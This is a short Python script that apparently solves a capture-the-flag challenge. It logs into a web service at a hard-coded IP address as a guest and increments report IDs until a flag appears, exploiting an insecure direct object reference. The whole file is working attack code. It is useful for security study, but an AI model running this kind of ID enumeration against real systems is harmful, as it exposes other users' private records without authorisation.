import re

import requests

BASE_URL = "http://23.179.17.92:5001"
s = requests.Session()
i = 340
data = {"username": "guest", "password": "Password123!"}
s.post(f"{BASE_URL}/register", data=data)
s.post(f"{BASE_URL}/login", data=data)

while True:
    params = {"id": i}
    res = s.get(f"{BASE_URL}/report", params=params)
    flag = re.search("CIT{.+}", res.text)

    if flag:
        print(flag.group())
        break
    else:
        i += 1
